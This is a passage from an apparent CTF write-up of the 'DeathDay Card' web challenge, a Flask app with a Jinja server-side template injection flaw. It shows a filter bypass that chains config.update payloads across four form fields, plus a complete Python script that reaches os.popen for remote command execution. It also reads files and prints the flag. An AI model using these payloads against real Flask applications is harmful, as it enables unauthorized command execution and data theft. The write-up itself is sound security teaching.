            &lt;link rel=</span><span class="sh">"</span><span class="s">stylesheet</span><span class="sh">"</span><span class="s"> href=</span><span class="sh">"</span><span class="s">static/style.css</span><span class="sh">"</span><span class="s">&gt;
            &lt;div&gt;
                &lt;h1&gt;Error: </span><span class="si">{</span><span class="nf">str</span><span class="p">(</span><span class="n">e</span><span class="p">)</span><span class="si">}</span><span class="s">&lt;/h1&gt;
                &lt;br&gt;
                &lt;p&gt;Please try again. &lt;a href=</span><span class="sh">"</span><span class="s">/</span><span class="sh">"</span><span class="s">&gt;Back to Card Generator&lt;/a&gt;&lt;/p&gt;
            &lt;/div&gt;
            </span><span class="sh">"""</span><span class="p">,</span> <span class="mi">400</span>
        

<span class="nd">@app.route</span><span class="p">(</span><span class="sh">"</span><span class="s">/debug/test</span><span class="sh">"</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="sh">"</span><span class="s">POST</span><span class="sh">"</span><span class="p">])</span>
<span class="k">def</span> <span class="nf">test_debug</span><span class="p">():</span>
    <span class="n">user</span> <span class="o">=</span> <span class="n">session</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">"</span><span class="s">user</span><span class="sh">"</span><span class="p">)</span>
    <span class="n">host</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">headers</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">"</span><span class="s">Host</span><span class="sh">"</span><span class="p">,</span> <span class="sh">""</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">host</span> <span class="o">!=</span> <span class="sh">"</span><span class="s">localhost:3030</span><span class="sh">"</span><span class="p">:</span>
        <span class="k">return</span> <span class="sh">"</span><span class="s">Access restricted to localhost:3030, this endpoint is only development purposes</span><span class="sh">"</span><span class="p">,</span> <span class="mi">403</span>
    <span class="k">if</span> <span class="ow">not</span> <span class="n">user</span><span class="p">:</span>
        <span class="k">return</span> <span class="sh">"</span><span class="s">You must be logged in to test debugging.</span><span class="sh">"</span><span class="p">,</span> <span class="mi">403</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="k">raise</span> <span class="nc">ValueError</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">Debugging error: SECRET_KEY=</span><span class="si">{</span><span class="n">KEY</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
    <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
        <span class="k">return</span> <span class="sh">"</span><span class="s">Debugging error occurred.</span><span class="sh">"</span><span class="p">,</span> <span class="mi">500</span>



<span class="nd">@app.route</span><span class="p">(</span><span class="sh">"</span><span class="s">/admin/report</span><span class="sh">"</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">admin_report</span><span class="p">():</span>
    <span class="n">auth_cookie</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">cookies</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">"</span><span class="s">session</span><span class="sh">"</span><span class="p">)</span>
    <span class="k">if</span> <span class="ow">not</span> <span class="n">auth_cookie</span><span class="p">:</span>
        <span class="nf">abort</span><span class="p">(</span><span class="mi">403</span><span class="p">,</span> <span class="sh">"</span><span class="s">Unauthorized access.</span><span class="sh">"</span><span class="p">)</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">token</span><span class="p">,</span> <span class="n">signature</span> <span class="o">=</span> <span class="n">auth_cookie</span><span class="p">.</span><span class="nf">rsplit</span><span class="p">(</span><span class="sh">"</span><span class="s">.</span><span class="sh">"</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
        <span class="kn">from</span> <span class="n">app.sign</span> <span class="kn">import</span> <span class="n">initFn</span>
        <span class="n">signer</span> <span class="o">=</span> <span class="nf">initFn</span><span class="p">(</span><span class="n">KEY</span><span class="p">)</span>
        <span class="n">sign_token_function</span> <span class="o">=</span> <span class="n">signer</span><span class="p">.</span><span class="nf">get_signer</span><span class="p">()</span>
        <span class="n">valid_signature</span> <span class="o">=</span> <span class="nf">sign_token_function</span><span class="p">(</span><span class="n">token</span><span class="p">)</span>

        <span class="k">if</span> <span class="n">valid_signature</span> <span class="o">!=</span> <span class="n">signature</span><span class="p">:</span>
            <span class="nf">abort</span><span class="p">(</span><span class="mi">403</span><span class="p">,</span> <span class="sa">f</span><span class="sh">"</span><span class="s">Invalid token.</span><span class="sh">"</span><span class="p">)</span>

        <span class="k">if</span> <span class="n">token</span> <span class="o">==</span> <span class="sh">"</span><span class="s">admin</span><span class="sh">"</span><span class="p">:</span>
            <span class="k">return</span> <span class="sh">"</span><span class="s">Flag: p_ctf{Redacted}</span><span class="sh">"</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="k">return</span> <span class="sh">"</span><span class="s">Access denied: admin only.</span><span class="sh">"</span>
    <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
        <span class="nf">abort</span><span class="p">(</span><span class="mi">403</span><span class="p">,</span> <span class="sa">f</span><span class="sh">"</span><span class="s">Invalid token format: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>

<span class="nd">@app.after_request</span>
<span class="k">def</span> <span class="nf">clear_imports</span><span class="p">(</span><span class="n">response</span><span class="p">):</span>
    <span class="k">if</span> <span class="sh">'</span><span class="s">app.sign</span><span class="sh">'</span> <span class="ow">in</span> <span class="n">sys</span><span class="p">.</span><span class="n">modules</span><span class="p">:</span>
        <span class="k">del</span> <span class="n">sys</span><span class="p">.</span><span class="n">modules</span><span class="p">[</span><span class="sh">'</span><span class="s">app.sign</span><span class="sh">'</span><span class="p">]</span>
    <span class="k">if</span> <span class="sh">'</span><span class="s">app.sign</span><span class="sh">'</span> <span class="ow">in</span> <span class="nf">globals</span><span class="p">():</span>
        <span class="k">del</span> <span class="nf">globals</span><span class="p">()[</span><span class="sh">'</span><span class="s">app.sign</span><span class="sh">'</span><span class="p">]</span>
    <span class="k">return</span> <span class="n">response</span>
</pre></td></tr></tbody></table></code></div>  </div>

</details>

<h3 id="identifying-vulnerabilities"><span class="me-2">Identifying vulnerabilities</span><a href="#identifying-vulnerabilities" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>I isolated the vulnerable part of the <code class="language-plaintext highlighter-rouge">personalized_card()</code> function <em>(simplified version)</em>:</p>

<div class="language-py highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre></td><td class="rouge-code"><pre><span class="n">recipient</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">"</span><span class="s">recipient</span><span class="sh">"</span><span class="p">)</span>
<span class="n">sender</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">"</span><span class="s">sender</span><span class="sh">"</span><span class="p">)</span>
<span class="n">message</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">"</span><span class="s">message</span><span class="sh">"</span><span class="p">)</span>
<span class="n">final_message</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">"</span><span class="s">message_final</span><span class="sh">"</span><span class="p">)</span>

<span class="k">if</span> <span class="n">validator</span><span class="p">.</span><span class="nf">security1</span><span class="p">(</span><span class="n">recipient</span><span class="p">,</span> <span class="n">sender</span><span class="p">,</span> <span class="n">message</span><span class="p">,</span> <span class="n">final_message</span><span class="p">)</span> <span class="ow">and</span> 
   <span class="n">validator</span><span class="p">.</span><span class="nf">security2</span><span class="p">(</span><span class="n">recipient</span><span class="p">,</span> <span class="n">sender</span><span class="p">,</span> <span class="n">message</span><span class="p">,</span> <span class="n">final_message</span><span class="p">):</span>
   
    <span class="n">template</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">"""</span><span class="s">
        &lt;h2&gt;From: </span><span class="si">{</span><span class="n">sender</span><span class="si">}</span><span class="s">&lt;/h2&gt;
        &lt;h2&gt;To: </span><span class="si">{</span><span class="n">recipient</span><span class="si">}</span><span class="s">&lt;/h2&gt;
        &lt;p&gt;</span><span class="si">{</span><span class="n">message</span><span class="si">}</span><span class="s">&lt;/p&gt;
        &lt;h1&gt;</span><span class="si">{</span><span class="n">final_message</span><span class="si">}</span><span class="s">&lt;/h1&gt;
    </span><span class="sh">"""</span>
</pre></td></tr></tbody></table></code></div></div>

<p>As you may have noticed, the backend does some sanitization before putting our string directly in the template. Let’s take a look at the validation part <em>(simplified version)</em>:</p>

<div class="language-py highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre></td><td class="rouge-code"><pre><span class="k">def</span> <span class="nf">security1</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">,</span> <span class="n">c</span><span class="p">,</span> <span class="n">d</span><span class="p">):</span>
    <span class="k">if</span> <span class="sh">'</span><span class="s">os</span><span class="sh">'</span> <span class="ow">in</span> <span class="n">a</span> <span class="ow">or</span> 
       <span class="sh">'</span><span class="s">os</span><span class="sh">'</span> <span class="ow">in</span> <span class="n">b</span> <span class="ow">or</span> 
       <span class="sh">'</span><span class="s">os</span><span class="sh">'</span> <span class="ow">in</span> <span class="n">c</span> <span class="ow">or</span> 
       <span class="sh">'</span><span class="s">os</span><span class="sh">'</span> <span class="ow">in</span> <span class="n">d</span><span class="p">:</span>
        <span class="k">return</span> <span class="bp">False</span>

<span class="k">def</span> <span class="nf">security2</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">,</span> <span class="n">c</span><span class="p">,</span> <span class="n">d</span><span class="p">):</span>
    <span class="k">if</span> <span class="nf">len</span><span class="p">(</span><span class="n">a</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">50</span> <span class="ow">or</span> 
       <span class="nf">len</span><span class="p">(</span><span class="n">b</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">50</span> <span class="ow">or</span> 
       <span class="nf">len</span><span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">50</span> <span class="ow">or</span> 
       <span class="nf">len</span><span class="p">(</span><span class="n">d</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">50</span><span class="p">:</span>
       <span class="k">return</span> <span class="bp">False</span>
</pre></td></tr></tbody></table></code></div></div>

<p>Ok so we clearly have an SSTI, but with <strong>maximum 50 chars by input</strong> and we <strong>can’t have “os”</strong> in our payload. Or can we ?</p>

<h1 id="exploitation">Exploitation</h1>

<h3 id="verifying-ssti"><span class="me-2">Verifying SSTI</span><a href="#verifying-ssti" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p><a href="/assets/img/writeups/DeathdayCard/home.png" class="popup img-link radius-shadow shimmer"><img src="/assets/img/writeups/DeathdayCard/home.png" alt="index"  loading="lazy"></a>
<em>DeathDay card home page</em></p>

<p>Let’s try a payload that passes the security checks:
<a href="/assets/img/writeups/DeathdayCard/index.png" class="popup img-link radius-shadow shimmer"><img src="/assets/img/writeups/DeathdayCard/index.png" alt="index"  loading="lazy"></a>
<a href="/assets/img/writeups/DeathdayCard/initial_ssti.png" class="popup img-link radius-shadow shimmer"><img src="/assets/img/writeups/DeathdayCard/initial_ssti.png" alt="index"  loading="lazy"></a>
<em>All inputs are vulnerable to SSTI.</em></p>

<h3 id="bypassing-restriction"><span class="me-2">Bypassing restriction</span><a href="#bypassing-restriction" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>The <strong>second validation</strong> <em>(length)</em> is quite annoying, but can easily be bypassed since we have 4 inputs. Problem is: <code class="language-plaintext highlighter-rouge">{{ x }}</code> will basically be replaced by <code class="language-plaintext highlighter-rouge">print(x)</code>, and in python you can’t <strong>assign variables</strong> in a print statement:</p>

<div class="language-py highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="nf">print</span><span class="p">(</span><span class="n">a</span><span class="o">=</span><span class="sh">"</span><span class="s">b</span><span class="sh">"</span><span class="p">)</span>
</pre></td></tr></tbody></table></code></div></div>
<p>You’re trying to call <code class="language-plaintext highlighter-rouge">print</code> with the argument <code class="language-plaintext highlighter-rouge">a</code> set to <code class="language-plaintext highlighter-rouge">"b"</code>, so you’re not assigning a variable. Is it impossible then ?</p>

<h4 id="theory"><span class="me-2">Theory</span><a href="#theory" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>

<p>Reading this <a href="https://niebardzo.github.io/2020-11-23-exploiting-jinja-ssti/">excellent article</a> I found a way. We can use the config object to temporarily store some data. So for example:</p>

<div class="language-py highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="p">{{</span> <span class="n">config</span><span class="p">.</span><span class="nf">update</span><span class="p">(</span><span class="n">myvariable</span><span class="o">=</span><span class="sh">"</span><span class="s">Hello World !</span><span class="sh">"</span><span class="p">)</span> <span class="p">}}</span>
</pre></td></tr></tbody></table></code></div></div>

<p>Then get the content using:</p>
<div class="language-py highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="p">{{</span> <span class="n">config</span><span class="p">.</span><span class="n">myvariable</span> <span class="p">}}</span>
</pre></td></tr></tbody></table></code></div></div>

<p>And this trick can be combined with another one: <strong>storing a variable from a GET parameter</strong> <em>(aka from the URL)</em> using:</p>

<div class="language-py highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="p">{{</span> <span class="n">config</span><span class="p">.</span><span class="nf">update</span><span class="p">(</span><span class="n">a</span><span class="o">=</span><span class="n">request</span><span class="p">.</span><span class="n">args</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">a</span><span class="sh">'</span><span class="p">))</span> <span class="p">}}</span>
</pre></td></tr></tbody></table></code></div></div>

<p>This code will basically store the value provided via the <code class="language-plaintext highlighter-rouge">a</code> GET parameter <em>(e.g., <code class="language-plaintext highlighter-rouge">?a=VALUE</code>)</em> and store it in <code class="language-plaintext highlighter-rouge">config.a</code>.</p>

<h4 id="practice"><span class="me-2">Practice</span><a href="#practice" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>

<p>We can bypass the <code class="language-plaintext highlighter-rouge">if "os" in a or "os" in b...</code> check <em>(first validation)</em>, simply by posting the form on this url:</p>
<ul>
  <li><a href="https://deathday.ctf.prgy.in?a=os">https://deathday.ctf.prgy.in?a=os</a></li>
</ul>

<p>and storing the <code class="language-plaintext highlighter-rouge">"os"</code> string in <code class="language-plaintext highlighter-rouge">config.a</code> like this:</p>

<div class="language-py highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="p">{{</span> <span class="n">config</span><span class="p">.</span><span class="nf">update</span><span class="p">(</span><span class="n">a</span><span class="o">=</span><span class="n">request</span><span class="p">.</span><span class="n">args</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">a</span><span class="sh">'</span><span class="p">))</span> <span class="p">}}</span>
</pre></td></tr></tbody></table></code></div></div>

<p>Essentially, we sacrificed <strong>50 characters on 200</strong> <em>(the first input, “Sender’s Name”)</em> to bypass the first check. <strong>Now <code class="language-plaintext highlighter-rouge">config.a = "os"</code></strong>. 
<br /><br />
Next using the “Recipient’s Name” input, we can claim up to the <code class="language-plaintext highlighter-rouge">os</code> module using the <code class="language-plaintext highlighter-rouge">config.a</code> variable, and store it in <code class="language-plaintext highlighter-rouge">config.b</code>, with this payload:</p>

<div class="language-py highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="p">{{</span> <span class="n">config</span><span class="p">.</span><span class="nf">update</span><span class="p">(</span><span class="n">b</span><span class="o">=</span><span class="n">lipsum</span><span class="p">.</span><span class="n">__globals__</span><span class="p">[</span><span class="n">config</span><span class="p">.</span><span class="n">a</span><span class="p">])</span> <span class="p">}}</span>
</pre></td></tr></tbody></table></code></div></div>

<p>We essentially have <code class="language-plaintext highlighter-rouge">config.b = OS_MODULE</code>. Since we have two inputs left, we can proceed as follows.</p>

<p>Third input <em>(message)</em> will be used to store the command that we want to execute, command that we will pass through the URL parameter <code class="language-plaintext highlighter-rouge">cmd</code>.</p>

<div class="language-py highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="p">{{</span> <span class="n">config</span><span class="p">.</span><span class="nf">update</span><span class="p">(</span><span class="n">cmd</span><span class="o">=</span><span class="n">request</span><span class="p">.</span><span class="n">args</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">cmd</span><span class="sh">'</span><span class="p">))</span> <span class="p">}}</span>
</pre></td></tr></tbody></table></code></div></div>

<p>Fourth input <em>(Final message)</em> will execute the command using the <code class="language-plaintext highlighter-rouge">os.popen(cmd).read()</code> syntax</p>

<div class="language-py highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre> <span class="n">config</span><span class="p">.</span><span class="n">b</span><span class="p">.</span><span class="nf">popen</span><span class="p">(</span><span class="n">config</span><span class="p">.</span><span class="n">cmd</span><span class="p">).</span><span class="nf">read</span><span class="p">()</span> <span class="p">}}</span>
</pre></td></tr></tbody></table></code></div></div>

<p>Here is a recap:</p>

<div class="table-wrapper"><table>
  <thead>
    <tr>
      <th style="text-align: left">Input name</th>
      <th style="text-align: left">SSTI Payload</th>
      <th style="text-align: left">Pseudocode</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td style="text-align: left">Sender’s name</td>
      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">{{ config.update(a=request.args.get('a')) }}</code></td>
      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">config.a = "os"</code></td>
    </tr>
    <tr>
      <td style="text-align: left"> </td>
      <td style="text-align: left"> </td>
      <td style="text-align: left"><strong>store “os” (the string) in config.a</strong></td>
    </tr>
    <tr>
      <td style="text-align: left">Recipient’s name</td>
      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">{{ config.update(b=lipsum.__globals__[config.a]) }}</code></td>
      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">config.b = import os</code></td>
    </tr>
    <tr>
      <td style="text-align: left"> </td>
      <td style="text-align: left"> </td>
      <td style="text-align: left"><strong>store os (the module) in config.b</strong></td>
    </tr>
    <tr>
      <td style="text-align: left">Message</td>
      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">{{ config.update(cmd=request.args.get('cmd')) }}</code></td>
      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">config.cmd = $_GET["cmd"]</code></td>
    </tr>
    <tr>
      <td style="text-align: left"> </td>
      <td style="text-align: left"> </td>
      <td style="text-align: left"><strong>store the command to execute in config.cmd</strong></td>
    </tr>
    <tr>
      <td style="text-align: left">Final Message</td>
      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">{{ config.b.popen(config.cmd).read() }}</code></td>
      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">config.b = os.popen(cmd) </code></td>
    </tr>
    <tr>
      <td style="text-align: left"> </td>
      <td style="text-align: left"> </td>
      <td style="text-align: left"><strong>display output of the command</strong></td>
    </tr>
  </tbody>
</table></div>

<h3 id="scripting"><span class="me-2">Scripting</span><a href="#scripting" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>I wrote a python script to automate this annoying task:</p>

<div file="ssti.py" class="language-py highlighter-rouge"><div class="code-header">
        <span data-label-text="ssti.py"><i class="far fa-file-code fa-fw"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
</pre></td><td class="rouge-code"><pre><span class="c1">#!/usr/bin/env python3
</span>
<span class="kn">from</span> <span class="n">requests</span> <span class="kn">import</span> <span class="n">post</span>
<span class="kn">from</span> <span class="n">sys</span> <span class="kn">import</span> <span class="n">argv</span>
<span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="n">log</span>

<span class="k">def</span> <span class="nf">exploit_ssti</span><span class="p">():</span>
    <span class="c1"># Use $_GET["a"] to bypass the "os" restriction
</span>    <span class="c1"># Use $_GET["c"] to store the command that we want to execute
</span>    <span class="n">URL</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">"</span><span class="s">https://deathday.ctf.prgy.in/?a=os&amp;cmd=</span><span class="si">{</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="si">}</span><span class="sh">"</span>

    <span class="k">return</span> <span class="nf">post</span><span class="p">(</span><span class="n">URL</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span>
        <span class="c1"># Store "os" (str) in config.a
</span>        <span class="sh">"</span><span class="s">sender</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"""</span><span class="s">{{config.update(a=request.args.get(</span><span class="sh">'</span><span class="s">a</span><span class="sh">'</span><span class="s">))}}</span><span class="sh">"""</span><span class="p">,</span>
        <span class="c1"># Store os (module) in config.b
</span>        <span class="sh">"</span><span class="s">recipient</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"""</span><span class="s">{{config.update(b=lipsum.__globals__[config.a])}}</span><span class="sh">"""</span><span class="p">,</span>
        <span class="c1"># Store the command that we want to execute in config.c
</span>        <span class="sh">"</span><span class="s">message</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"""</span><span class="s">{{config.update(cmd=request.args.get(</span><span class="sh">'</span><span class="s">cmd</span><span class="sh">'</span><span class="s">))}}</span><span class="sh">"""</span><span class="p">,</span>
        <span class="c1"># display os.popen(command).read()
</span>        <span class="sh">"</span><span class="s">message_final</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"""</span><span class="s">{{config.b.popen(config.cmd).read()}}</span><span class="sh">"""</span>
    <span class="p">})</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="sh">"</span><span class="s">__main__</span><span class="sh">"</span><span class="p">:</span>
    <span class="nf">if</span><span class="p">(</span><span class="nf">len</span><span class="p">(</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">):</span>
        <span class="n">log</span><span class="p">.</span><span class="nf">failure</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">Usage: </span><span class="si">{</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="si">}</span><span class="s"> &lt;command&gt;</span><span class="sh">"</span><span class="p">)</span>
        <span class="nf">exit</span><span class="p">()</span>

    <span class="n">log</span><span class="p">.</span><span class="nf">info</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">Executing command: </span><span class="si">{</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>

    <span class="c1"># Get the response from the server
</span>    <span class="n">response</span> <span class="o">=</span> <span class="nf">exploit_ssti</span><span class="p">()</span>
    <span class="c1"># Parse it
</span>    <span class="n">message_final</span> <span class="o">=</span> <span class="n">response</span><span class="p">.</span><span class="n">text</span><span class="p">.</span><span class="nf">split</span><span class="p">(</span><span class="sh">"</span><span class="s">&lt;h1&gt;</span><span class="sh">"</span><span class="p">)[</span><span class="o">-</span><span class="mi">1</span><span class="p">].</span><span class="nf">split</span><span class="p">(</span><span class="sh">"</span><span class="s">&lt;/h1&gt;</span><span class="sh">"</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>


    <span class="nf">if</span><span class="p">(</span><span class="n">message_final</span> <span class="o">==</span> <span class="sh">""</span><span class="p">):</span> 
        <span class="n">message_final</span> <span class="o">=</span> <span class="sh">"</span><span class="s">No output</span><span class="sh">"</span>

    <span class="n">log</span><span class="p">.</span><span class="nf">success</span><span class="p">(</span><span class="n">message_final</span><span class="p">)</span>
</pre></td></tr></tbody></table></code></div></div>

<p>Now, we can execute any command we want !</p>

<h3 id="getting-the-flag"><span class="me-2">Getting the Flag</span><a href="#getting-the-flag" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>But then, that happened:</p>

<p><a href="/assets/img/writeups/DeathdayCard/strange.png" class="popup img-link radius-shadow shimmer"><img src="/assets/img/writeups/DeathdayCard/strange.png" alt="index"  loading="lazy"></a>
<em>What ?</em></p>

<p>So, apparently we can’t use <code class="language-plaintext highlighter-rouge">cat</code> or <code class="language-plaintext highlighter-rouge">ls</code>, meaning the <a href="https://wiki.debian.org/coreutils">coreutils</a> are probably not installed in this container. Let’s take a look at the installed binaries:</p>

<p><a href="/assets/img/writeups/DeathdayCard/no_ls.png" class="popup img-link radius-shadow shimmer"><img src="/assets/img/writeups/DeathdayCard/no_ls.png" alt="index"  loading="lazy"></a>
<em>nothing …</em></p>

<p>Not a big deal since <strong>python</strong> is installed. We can use it for <strong>arbitrary file read</strong>. I’ll go with <a href="https://gtfobins.github.io/gtfobins/python/#file-read">the GTFObins command</a>.</p>

<p><a href="/assets/img/writeups/DeathdayCard/leaking_app.png" class="popup img-link radius-shadow shimmer"><img src="/assets/img/writeups/DeathdayCard/leaking_app.png" alt="index"  loading="lazy"></a>
<em>GGs !</em></p>

<p>FInally, we retrieve the flag using <code class="language-plaintext highlighter-rouge">grep</code>:
<a href="/assets/img/writeups/DeathdayCard/getting_flag.png" class="popup img-link radius-shadow shimmer"><img src="/assets/img/writeups/DeathdayCard/getting_flag.png" alt="index"  loading="lazy"></a></p>

<div file="flag.txt" class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="flag.txt"><i class="far fa-file-code fa-fw"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>p_ctf{I_aInT_lEaVinG_sSTi_hEhEhE}
</pre></td></tr></tbody></table></code></div></div>

  </div>

  <div class="post-tail-wrapper text-muted">
    <!-- categories -->
    
      <div class="post-meta mb-3">
        <i class="far fa-folder-open fa-fw me-1"></i>
        
          <a href="/categories/writeups/">Writeups</a>,
          <a href="/categories/ctftime2025/">CTFTime2025</a>,
          <a href="/categories/pragyan/">Pragyan</a>
      </div>
    

    <!-- tags -->
    
      <div class="post-tags">
        <i class="fa fa-tags fa-fw me-1"></i>
        
          <a
            href="/tags/writeups/"
            class="post-tag no-text-decoration"
          >writeups</a>
        
          <a
            href="/tags/web/"
            class="post-tag no-text-decoration"
          >web</a>
        
          <a
            href="/tags/ssti/"
            class="post-tag no-text-decoration"
          >ssti</a>
        
          <a
            href="/tags/flask/"
            class="post-tag no-text-decoration"
          >flask</a>
        
          <a
            href="/tags/jinja/"
            class="post-tag no-text-decoration"
          >jinja</a>
        
          <a
            href="/tags/python-scripting/"
